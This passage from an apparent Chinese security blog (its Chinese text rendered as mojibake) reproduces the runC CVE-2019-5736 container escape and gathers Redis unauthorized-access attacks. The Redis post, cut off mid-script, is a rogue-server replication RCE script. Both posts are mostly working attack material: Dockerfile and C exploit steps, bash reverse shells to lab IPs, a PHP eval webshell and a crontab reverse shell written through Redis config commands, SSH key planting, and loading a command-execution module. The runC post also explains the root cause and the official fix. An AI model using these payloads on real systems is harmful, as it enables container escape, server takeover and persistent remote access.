<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ADD run_at_link.c /root/run_at_link.c</span><br><span class="line">RUN set -e -x ;\</span><br><span class="line">    cd /root/libseccomp-* ;\</span><br><span class="line">    cat /root/run_at_link.c &gt;&gt; src/api.c ;\</span><br><span class="line">    DEB_BUILD_OPTIONS=nocheck dpkg-buildpackage -b -uc -us ;\</span><br><span class="line">    dpkg -i /root/*.deb</span><br></pre></td></tr></table></figure>

<p>2.overwrite_runcæ·»åŠ dockerä¸­å¹¶ç¼–è¯‘ 3.ä½¿å…¥å£ç‚¹æŒ‡å‘runc</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">RUN set -e -x ;\</span><br><span class="line">    ln -s /proc/self/exe /entrypoint</span><br><span class="line">ENTRYPOINT [ &quot;/entrypoint&quot; ]</span><br></pre></td></tr></table></figure>

<blockquote>
<p>  run_at_linkæ–‡ä»¶</p>
</blockquote>
<p>1.run_at_link read runc binary è·å¾—fd</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int runc_fd_read = open(&quot;/proc/self/exe&quot;, O_RDONLY);</span><br><span class="line">    if (runc_fd_read == -1 ) &#123;</span><br><span class="line">        printf(&quot;[!] can&#x27;t open /proc/self/exe\n&quot;);</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line">    printf(&quot;[+] Opened runC for reading as /proc/self/fd/%d\n&quot;, runc_fd_read);</span><br><span class="line">    fflush(stdout);</span><br></pre></td></tr></table></figure>

<p>2.è°ƒç”¨execveæ‰§è¡Œoverwrite_runc</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">execve(&quot;/overwrite_runc&quot;, argv_overwrite, NULL); </span><br></pre></td></tr></table></figure>

<p>3.overwrite_runcå†™å…¥poc string</p>
<hr>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ cd RunC-CVE-2019-5736</span><br><span class="line">$ docker build -t cve-2019-5736:malicious_image_POC ./malicious_image_POC</span><br><span class="line">$ docker run --rm cve-2019-5736:malicious_image_POC</span><br></pre></td></tr></table></figure>

<p>ä¿®æ”¹ new_runc , ä¿®æ”¹æ¥æ”¶åå¼¹shell çš„åœ°å€</p>
<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112290918319.png" alt="image-20211202101831715"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.119.137/7777 0&gt;&amp;1 &amp;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112290918255.png" alt="image-20211202101719829"></p>
<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112290918493.png" alt="image-20211202101522575"></p>
<p>æ¥æ”¶åå¼¹shell </p>
<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112290918457.png" alt="image-20211202101656476"></p>
<p>æŸ¥çœ‹ip , ç¡®è®¤ä¸º å®¿ä¸»æœº </p>
<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112290919450.png" alt="image-20211202101715579"></p>
<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112290918264.png" alt="image-20211202101936883"></p>
<h2 id="æ¼æ´åŸç†"><a href="#æ¼æ´åŸç†" class="headerlink" title="æ¼æ´åŸç†"></a>æ¼æ´åŸç†</h2><p>æ¼æ´æ€»ç»“ä¸‹æ¥å°±æ˜¯ä¸€å¥è¯ï¼Œæ”»å‡»è€…å¯ä»¥é‡å†™å®¿ä¸»æœºä¸Šçš„runcäºŒè¿›åˆ¶æ–‡ä»¶ã€‚</p>
<p>å…ˆæ¥çœ‹<code>/proc/self/exe</code>æ˜¯ä»€ä¹ˆï¼Ÿ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ file /proc/self/exe</span><br><span class="line">/proc/self/exe: symbolic link to /usr/bin/file</span><br></pre></td></tr></table></figure>

<p>proc&#x2F;self&#x2F;exeç¬¦å·é“¾æ¥ä¼šæŒ‡å‘è°ƒç”¨è€…è‡ªèº«ï¼ŒåŒç†proc&#x2F;pid&#x2F;exeä¼šæŒ‡å‘pidè¿›ç¨‹çš„è°ƒç”¨è€…ã€‚ä½†æ˜¯&#x2F;proc&#x2F;pid&#x2F;exeå’Œä¸€èˆ¬ç¬¦å·é“¾æ¥ä¸åŒï¼Œå…¶ä¸éµå¾ªç¬¦å·é“¾æ¥çš„æ­£å¸¸è¯­ä¹‰ï¼Œå½“è¿›ç¨‹æ‰“å¼€&#x2F;proc&#x2F;pid&#x2F;exeæ—¶ï¼Œæ²¡æœ‰æ­£å¸¸çš„è¯»å–å’Œè·Ÿè¸ªç¬¦å·é“¾æ¥å†…å®¹çš„è¿‡ç¨‹ã€‚ç›¸åï¼Œå†…æ ¸åªæ˜¯è®©ç”¨æˆ·ç›´æ¥è®¿é—®æ‰“å¼€çš„æ–‡ä»¶æ¡ç›®ã€‚</p>
<p>æ¼æ´äº§ç”Ÿçš„åŸå› å°±æ˜¯å®¿ä¸»æœºé€šè¿‡runcå¯¹dockerå®¹å™¨è¿›è¡Œæ“ä½œçš„æ—¶å€™æ²¡æœ‰åšå¥½è®¿é—®é™åˆ¶ï¼Œå¯¼è‡´runcå¯ä»¥é€šè¿‡&#x2F;proc&#x2F;self&#x2F;exeç¬¦å·é“¾æ¥æ¥è®¿é—®åˆ°å®¿ä¸»æœºä¸Šçš„runcæ–‡ä»¶ã€‚æ”»å‡»è€…å¯ä»¥è®©runcè¿è¡Œ&#x2F;proc&#x2F;self&#x2F;exeç¬¦å·é“¾æ¥æ¥æ¬ºéª—å®ƒè‡ªå·±æ‰§è¡Œè‡ªå·±ï¼Œä»è€Œå¯¹å®¿ä¸»æœºä¸Šçš„runcæ–‡ä»¶è¿›è¡Œè¦†ç›–é‡å†™ã€‚</p>
<p>å…·ä½“çš„åˆ©ç”¨æ­¥éª¤ï¼š</p>
<ol>
<li>å®¹å™¨å†…ç”Ÿæˆä¸€ä¸ªæ¶æ„æ–‡ä»¶ï¼Œå°†æ–‡ä»¶çš„è°ƒç”¨è€…æ”¹ä¸ºproc&#x2F;self&#x2F;exe</li>
<li>å®¿ä¸»æœºdocker execè°ƒç”¨è¯¥æ¶æ„æ–‡ä»¶ï¼Œä¼šè°ƒç”¨proc&#x2F;self&#x2F;exeï¼Œä¹Ÿå°±æ˜¯runcï¼Œæ­¤æ—¶å®¹å™¨å†…ä¾¿å¯ä»¥éå†procè¿›ç¨‹å·ï¼Œè·å–runcçš„è¿›ç¨‹å·</li>
<li>å¾—åˆ°å®¹å™¨è¿›ç§°å·PIDåï¼Œå¯ä»¥è·å–&#x2F;proc&#x2F;pid&#x2F;exeæ–‡ä»¶æè¿°ç¬¦fd</li>
<li>å¯¹fdè¿›è¡Œå†™æ“ä½œï¼Œè¦†ç›–åŸæœ‰runcçš„æ–‡ä»¶</li>
</ol>
<p><strong>é—®é¢˜1ï¼šæ”»å‡»è€…ä¸ºä»€ä¹ˆä¸ç»§ç»­å†™å…¥æ¶æ„æ–‡ä»¶ä»è€Œè¦†ç›–ä¸»æœºä¸Šçš„runcäºŒè¿›åˆ¶æ–‡ä»¶ï¼Ÿ</strong></p>
<p>å› ä¸ºå†…æ ¸å°†ä¸å…è®¸åœ¨æ‰§è¡ŒrunCæ—¶å°†å…¶è¦†ç›–ã€‚äºæ˜¯å¯ä»¥é€šè¿‡è·å–&#x2F;proc&#x2F;PID&#x2F;exeçš„file handler æ¥è·å–runcinitçš„æ–‡ä»¶æè¿°ç¬¦ã€‚ ç„¶åå†å†™å…¥è¯¥æ–‡ä»¶ã€‚</p>
<p><strong>é—®é¢˜2ï¼šruncåˆ›å»ºå®¹å™¨æ—¶,ä¼šé¦–å…ˆåˆ›å»ºæ–°è¿›ç¨‹runc-initï¼Œå¹¶ä¸”runc-initåœ¨å¦ä¸€ä¸ªnamespaceé‡Œé¢ï¼Œç”¨æ¥åšéš”ç¦»ï¼Œé‚£ä¹ˆä¸ºä»€ä¹ˆä¸è¦†ç›–runcçš„å­è¿›ç¨‹runC initï¼Ÿ</strong></p>
<p>CVE-2016-9962æ¼æ´ä¿®è¡¥ç¨‹åºåœ¨è¿›å…¥å®¹å™¨ä¹‹å‰å°±å°†runC initè¿›ç¨‹è®¾ç½®ä¸ºâ€œä¸å¯è½¬å‚¨â€ï¼ˆNon-dumpableï¼‰ã€‚å…¶æ¼æ´åŸç†æ˜¯runC initè¿›ç¨‹æ‹¥æœ‰æ¥è‡ªå®¿ä¸»æœºçš„æ‰“å¼€æ–‡ä»¶æè¿°ç¬¦ï¼Œå®¹å™¨ä¸­çš„æ”»å‡»è€…å¯ä»¥åˆ©ç”¨å®ƒæ¥éå†ä¸»æœºçš„æ–‡ä»¶ç³»ç»Ÿï¼Œä»è€Œæ‰“å¼€å®¹å™¨ã€‚</p>
<h3 id="seebug"><a href="#seebug" class="headerlink" title="seebug"></a>seebug</h3><p><strong>runCåˆ©ç”¨é“¾åˆ†æ</strong></p>
<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112290919387.png" alt="image-20211208090108977"></p>
<h2 id="ä¿®å¤å»ºè®®"><a href="#ä¿®å¤å»ºè®®" class="headerlink" title="ä¿®å¤å»ºè®®"></a>ä¿®å¤å»ºè®®</h2><p>æ›´æ–°è‡³ æœ€æ–°ç‰ˆæœ¬</p>
<p>å®˜æ–¹ä¿®å¤æ–¹å¼</p>
<p>é“¾æ¥: <a href="https://github.com/opencontainers/runc/commit/6635b4f0c6af3810594d2770f662f34ddc15b40d">https://github.com/opencontainers/runc/commit/6635b4f0c6af3810594d2770f662f34ddc15b40d</a></p>
<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112290919593.png" alt="image-20211208093157249"></p>
<p>å¢åŠ äº†ä¸€ä¸ª<code>ensure_cloned_binary</code>å‡½æ•°</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> ensure_cloned_binary(void)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> execfd;</span><br><span class="line">    char **argv = NULL, **envp = NULL;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Check that we&#x27;re not self-cloned, and if we are then bail. */</span></span><br><span class="line">    <span class="type">int</span> cloned = is_self_cloned();</span><br><span class="line">    <span class="keyword">if</span> (cloned &gt; <span class="number">0</span> || cloned == -ENOTRECOVERABLE)</span><br><span class="line">        <span class="keyword">return</span> cloned;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (fetchve(&amp;argv, &amp;envp) &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">    execfd = clone_binary();</span><br><span class="line">    <span class="keyword">if</span> (execfd &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> -EIO;</span><br><span class="line"></span><br><span class="line">    fexecve(execfd, argv, envp);</span><br><span class="line">    <span class="keyword">return</span> -ENOEXEC;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">static <span class="type">int</span> is_self_cloned(void)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> fd, ret, is_cloned = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    fd = open(<span class="string">&quot;/proc/self/exe&quot;</span>, O_RDONLY|O_CLOEXEC);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> -ENOTRECOVERABLE;</span><br><span class="line"></span><br><span class="line">#ifdef HAVE_MEMFD_CREATE</span><br><span class="line">    ret = fcntl(fd, F_GET_SEALS);</span><br><span class="line">    is_cloned = (ret == RUNC_MEMFD_SEALS);</span><br><span class="line">#<span class="keyword">else</span></span><br><span class="line">    <span class="keyword">struct</span> stat statbuf = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    ret = fstat(fd, &amp;statbuf);</span><br><span class="line">    <span class="keyword">if</span> (ret &gt;= <span class="number">0</span>)</span><br><span class="line">        is_cloned = (statbuf.st_nlink == <span class="number">0</span>);</span><br><span class="line">#endif</span><br><span class="line">    <span class="built_in">close</span>(fd);</span><br><span class="line">    <span class="keyword">return</span> is_cloned;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åˆ¤æ–­<code>/proc/self/exe</code>æ˜¯å¦è¢«cloneï¼Œå¦‚æœæ²¡æœ‰çš„è¯ï¼Œåˆ™æ‰§è¡Œ<code>clone_binary</code>å‡½æ•°ï¼Œè¿”å›ä¸€ä¸ªæ–°çš„file handlerã€‚</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">static <span class="type">int</span> clone_binary(void)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> binfd, memfd;</span><br><span class="line">    ssize_t sent = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">#ifdef HAVE_MEMFD_CREATE</span><br><span class="line">    memfd = memfd_create(RUNC_MEMFD_COMMENT, MFD_CLOEXEC | MFD_ALLOW_SEALING);</span><br><span class="line">#<span class="keyword">else</span></span><br><span class="line">    memfd = open(<span class="string">&quot;/tmp&quot;</span>, O_TMPFILE | O_EXCL | O_RDWR | O_CLOEXEC, <span class="number">0711</span>);</span><br><span class="line">#endif</span><br><span class="line">    <span class="keyword">if</span> (memfd &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> -ENOTRECOVERABLE;</span><br><span class="line"></span><br><span class="line">    binfd = open(<span class="string">&quot;/proc/self/exe&quot;</span>, O_RDONLY | O_CLOEXEC);</span><br><span class="line">    <span class="keyword">if</span> (binfd &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">goto</span> <span class="type">error</span>;</span><br><span class="line"></span><br><span class="line">    sent = sendfile(memfd, binfd, NULL, RUNC_SENDFILE_MAX);</span><br><span class="line">    <span class="built_in">close</span>(binfd);</span><br><span class="line">    <span class="keyword">if</span> (sent &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">goto</span> <span class="type">error</span>;</span><br><span class="line"></span><br><span class="line">#ifdef HAVE_MEMFD_CREATE</span><br><span class="line">    <span class="type">int</span> err = fcntl(memfd, F_ADD_SEALS, RUNC_MEMFD_SEALS);</span><br><span class="line">    <span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">goto</span> <span class="type">error</span>;</span><br><span class="line">#<span class="keyword">else</span></span><br><span class="line">    <span class="comment">/* Need to re-open &quot;memfd&quot; as read-only to avoid execve(2) giving -EXTBUSY. */</span></span><br><span class="line">    <span class="type">int</span> newfd;</span><br><span class="line">    char *fdpath = NULL;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (asprintf(&amp;fdpath, <span class="string">&quot;/proc/self/fd/%d&quot;</span>, memfd) &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">goto</span> <span class="type">error</span>;</span><br><span class="line">    newfd = open(fdpath, O_RDONLY | O_CLOEXEC);</span><br><span class="line">    free(fdpath);</span><br><span class="line">    <span class="keyword">if</span> (newfd &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">goto</span> <span class="type">error</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">close</span>(memfd);</span><br><span class="line">    memfd = newfd;</span><br><span class="line">#endif</span><br><span class="line">    <span class="keyword">return</span> memfd;</span><br><span class="line"></span><br><span class="line"><span class="type">error</span>:</span><br><span class="line">    <span class="built_in">close</span>(memfd);</span><br><span class="line">    <span class="keyword">return</span> -EIO;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>







<h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><p><a href="https://www.freebuf.com/articles/web/258398.html">https://www.freebuf.com/articles/web/258398.html</a></p>
<p><a href="https://thinkycx.me/2019-05-23-CVE-2019-5736-docker-escape-recurrence.html">https://thinkycx.me/2019-05-23-CVE-2019-5736-docker-escape-recurrence.html</a></p>
<p><a href="https://saucer-man.com/information_security/547.html">https://saucer-man.com/information_security/547.html</a></p>
<h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><ul>
<li><a href="https://github.com/q3k/cve-2019-5736-poc">https://github.com/q3k/cve-2019-5736-poc</a></li>
<li><a href="https://github.com/twistlock/RunC-CVE-2019-5736">https://github.com/twistlock/RunC-CVE-2019-5736</a></li>
</ul>
]]></content>
      <categories>
        <category>ç½‘ç»œå®‰å…¨</category>
        <category>æ¼æ´å¤ç°</category>
      </categories>
      <tags>
        <tag>ç½‘ç»œå®‰å…¨</tag>
        <tag>æ¼æ´å¤ç°</tag>
      </tags>
  </entry>
  <entry>
    <title>Redisæœªæˆæƒè®¿é—®åˆ©ç”¨æ–¹å¼æ€»ç»“</title>
    <url>/articles/d81db563/</url>
    <content><![CDATA[<h1 id="Redisæœªæˆæƒè®¿é—®åˆ©ç”¨æ–¹å¼æ€»ç»“"><a href="#Redisæœªæˆæƒè®¿é—®åˆ©ç”¨æ–¹å¼æ€»ç»“" class="headerlink" title="Redisæœªæˆæƒè®¿é—®åˆ©ç”¨æ–¹å¼æ€»ç»“"></a>Redisæœªæˆæƒè®¿é—®åˆ©ç”¨æ–¹å¼æ€»ç»“</h1><h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><p>å®˜æ–¹ä¸‹è½½åœ°å€: <a href="https://download.redis.io/releases/">https://download.redis.io/releases/</a></p>
<p>ç¼–è¯‘å®‰è£…, </p>
<p>æˆ–è€…ä½¿ç”¨Docker ç¯å¢ƒ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// docker pull redis:4.0</span><br><span class="line">docker pull redis:5.0</span><br></pre></td></tr></table></figure>



<h2 id="åŸºç¡€åˆ©ç”¨"><a href="#åŸºç¡€åˆ©ç”¨" class="headerlink" title="åŸºç¡€åˆ©ç”¨"></a>åŸºç¡€åˆ©ç”¨</h2><ul>
<li><h4 id="bashåå¼¹shell"><a href="#bashåå¼¹shell" class="headerlink" title="bashåå¼¹shell"></a>bashåå¼¹shell</h4></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.119.137/7777 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<h3 id="å†™å…¥webshell"><a href="#å†™å…¥webshell" class="headerlink" title="å†™å…¥webshell"></a>å†™å…¥webshell</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">config set dir /var/www/html</span><br><span class="line">config set dbfilename shell.php</span><br><span class="line">set webshell &quot;&lt;?php @eval($_POST[&#x27;cmd&#x27;]);?&gt;&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure>

<h3 id="è®¡åˆ’ä»»åŠ¡åå¼¹shell"><a href="#è®¡åˆ’ä»»åŠ¡åå¼¹shell" class="headerlink" title="è®¡åˆ’ä»»åŠ¡åå¼¹shell"></a>è®¡åˆ’ä»»åŠ¡åå¼¹shell</h3><p>åˆ©ç”¨crontabåå¼¹shell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set x &quot;\n\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.119.1/7777 0&gt;&amp;1\n\n&quot;</span><br><span class="line">config set dir /var/spool/cron/crontabs</span><br><span class="line">config set dbfilename root</span><br><span class="line">save</span><br></pre></td></tr></table></figure>

<h3 id="å†™å…¥å…¬é’¥"><a href="#å†™å…¥å…¬é’¥" class="headerlink" title="å†™å…¥å…¬é’¥"></a>å†™å…¥å…¬é’¥</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379&gt; config get dir</span><br><span class="line">1) &quot;dir&quot;</span><br><span class="line">2) &quot;/&quot;</span><br><span class="line">127.0.0.1:6379&gt; config set dir /root/.ssh/</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; config get dir</span><br><span class="line">1) &quot;dir&quot;</span><br><span class="line">2) &quot;/root/.ssh&quot;</span><br><span class="line">127.0.0.1:6379&gt; config set dbfilename authorized_keys</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; set x &quot;AAAAB3NzaC1yc2EAAAADAQABAAABgQCzmbxEDVJkRj8CfUb94H//exUqIxTe67ssJBHYJVok9ZVB3g8SYdHrkzrXZpfx5VqgoCEJjNNwuVGP/2R3AK/XgtqYcCAfzWnBRdA8vW5LVzB61wqyYIugQaC9y56x+QTTXuKTltgjpjuBXsAlQ6+5TlPB79qonV/xEsAr7PzxghhtxIZF2A+XTxrTJ4ByfUCvfpZ1ORxNdbnVEWMfSR6RYko9eVkC5AuRiscdYKumrP5Waoj4ET5D+/rRPxE9SPSAIRYs68DZ9mbkKhHgZLVCqNfFp1yZ/t97DfKihn9nRWwQjetSsrqLDbBfhLA0Frq0o+usaevuSL5dgToSwLg5IuWMVvdkcpbK92M9eb7Y0aWgSfGXbkaVegCtriDRYLNK/8rifro1vKwIG1aBcR7NyEe0KGQV9pYO8HPY0TpDq4eDNq1lAGTgND/DAVqXnVce9yPID+XgPhpTt1gxzGdjaNDNSZTotsHppK3EsYsV54QlMseIubHP0DXpgSkLWws=&quot; (PS: è¿™é‡Œå†…å®¹ä¸ºå…¬é’¥ ä¸­é—´çš„å¯†é’¥æ–‡ä»¶)</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; save</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/etc/init.d/ssh restart</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -p 10022 -i id_rsa root@127.0.0.1</span><br><span class="line">-p æŒ‡å®šç«¯å£</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112032107903.png" alt="image-20201124124820325"></p>
<h2 id="ä¸»ä»å¤åˆ¶"><a href="#ä¸»ä»å¤åˆ¶" class="headerlink" title="ä¸»ä»å¤åˆ¶"></a>ä¸»ä»å¤åˆ¶</h2><p><strong>Redisä¸»ä»å¤åˆ¶è¯¦è§£:</strong> </p>
<p><a href="https://www.bbsmax.com/A/l1dyv3Agze/">https://www.bbsmax.com/A/l1dyv3Agze/</a></p>
<p><strong>ä¸»ä»å¤åˆ¶æµé‡åˆ†æ:</strong></p>
<p><a href="https://inhann.top/2021/09/14/redis_master_slave_rce/">https://inhann.top/2021/09/14/redis_master_slave_rce/</a></p>
<h3 id="ç¯å¢ƒæ­å»º-1"><a href="#ç¯å¢ƒæ­å»º-1" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h3><h4 id="ä½¿ç”¨-Docker-æ­å»º"><a href="#ä½¿ç”¨-Docker-æ­å»º" class="headerlink" title="ä½¿ç”¨ Docker æ­å»º"></a>ä½¿ç”¨ Docker æ­å»º</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker pull redis:5.0</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Redis_1</span><br><span class="line">docker run -it -d -p 6380:6379 --name Redis_1 redis:5.0</span><br></pre></td></tr></table></figure>

<h4 id="ç¼–è¯‘æºç æ­å»º"><a href="#ç¼–è¯‘æºç æ­å»º" class="headerlink" title="ç¼–è¯‘æºç æ­å»º"></a>ç¼–è¯‘æºç æ­å»º</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget https://download.redis.io/releases/redis-5.0.14.tar.gz</span><br><span class="line">tar xvf redis-5.0.14.tar.gz</span><br><span class="line">cd redis-5.0.14</span><br><span class="line">make</span><br></pre></td></tr></table></figure>

<p><strong>ä¿æŠ¤æ¨¡å¼æŠ¥é”™</strong></p>
<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112032107733.png" alt="image-20211203143019591"></p>
<p><strong>è§£å†³æ–¹å¼</strong></p>
<p>é…ç½®æ–‡ä»¶ä¸­å¯ä»¥å…³é—­ä¿æŠ¤æ¨¡å¼</p>
<p> <img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112032107688.png" alt="image-20211203143103050"></p>
<p><strong>é…ç½®ç»‘å®šip</strong> </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bind 192.168.56.106 // æˆ–è€… 0.0.0.0</span><br></pre></td></tr></table></figure>

<p> <img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112032107992.png" alt="image-20211203143328195"></p>
<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112032108446.png" alt="image-20211203143350114"></p>
<p> <img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112032108939.png" alt="image-20211203143411876"></p>
<h3 id="æ„å»ºæ¶æ„-so-æ–‡ä»¶"><a href="#æ„å»ºæ¶æ„-so-æ–‡ä»¶" class="headerlink" title="æ„å»ºæ¶æ„ .so æ–‡ä»¶"></a>æ„å»ºæ¶æ„ .so æ–‡ä»¶</h3><p>githubé¡¹ç›®åœ°å€: <a href="https://github.com/n0b0dyCN/RedisModules-ExecuteCommand">https://github.com/n0b0dyCN/RedisModules-ExecuteCommand</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd RedisModules-ExecuteCommand</span><br><span class="line">make</span><br><span class="line"># module.so åœ¨srcç›®å½•ä¸‹</span><br></pre></td></tr></table></figure>

<p>å¯¼å…¥æ¨¡å—æ–¹å¼</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">redis-server ./redis.conf --loadmodule ./module.so</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">redis-cli -h xxxxx</span><br><span class="line">&gt; module load ./module.so</span><br></pre></td></tr></table></figure>

<p><strong>å‘½ä»¤æ‰§è¡Œ</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt; system.exec &quot;whoami&quot;</span><br></pre></td></tr></table></figure>



<h3 id="è„šæœ¬æ¢æµ‹"><a href="#è„šæœ¬æ¢æµ‹" class="headerlink" title="è„šæœ¬æ¢æµ‹:"></a>è„šæœ¬æ¢æµ‹:</h3><p><a href="https://github.com/Ridter/redis-rce">https://github.com/Ridter/redis-rce</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python redis-rce.py -r 192.168.56.106 -p 6380 -L 192.168.56.106  -f module.so</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112032108335.png" alt="image-20211203151828074"></p>
<h3 id="æ‰‹å·¥æ¢æµ‹"><a href="#æ‰‹å·¥æ¢æµ‹" class="headerlink" title="æ‰‹å·¥æ¢æµ‹"></a>æ‰‹å·¥æ¢æµ‹</h3><hr>
<p><strong>æ¶æ„RedisæœåŠ¡ç«¯æ¨¡æ‹Ÿè„šæœ¬</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">from</span> optparse <span class="keyword">import</span> OptionParser</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">RogueServer</span>(<span class="params">lport</span>):</span><br><span class="line">    resp = <span class="string">&quot;&quot;</span></span><br><span class="line">    sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    sock.bind((<span class="string">&quot;0.0.0.0&quot;</span>,lport))</span><br><span class="line">    sock.listen(<span class="number">10</span>)</span><br><span class="line">    conn,address = sock.accept()  </span><br><span class="line">    sleep(<span class="number">5</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:    </span><br><span class="line">        data = conn.recv(<span class="number">1024</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;PING&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">            resp=<span class="string">&quot;+PONG&quot;</span>+CLRF</span><br><span class="line">            conn.send(resp)</span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&quot;REPLCONF&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">            resp=<span class="string">&quot;+OK&quot;</span>+CLRF</span><br><span class="line">            conn.send(resp)</span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&quot;PSYNC&quot;</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">&quot;SYNC&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">            resp =  <span class="string">&quot;+FULLRESYNC &quot;</span> + <span class="string">&quot;Z&quot;</span>*<span class="number">40</span> + <span class="string">&quot; 1&quot;</span> + CLRF</span><br><span class="line">            resp += <span class="string">&quot;$&quot;</span> + <span class="built_in">str</span>(<span class="built_in">len</span>(payload)) + CLRF</span><br><span class="line">            resp = resp.encode()</span><br><span class="line">            resp += payload + CLRF.encode()</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">type</span>(resp) != <span class="built_in">bytes</span>:</span><br><span class="line">                resp =resp.encode()            </span><br><span class="line">            conn.send(resp)    </span><br><span class="line">        <span class="comment">#elif &quot;exit&quot; in data:</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span 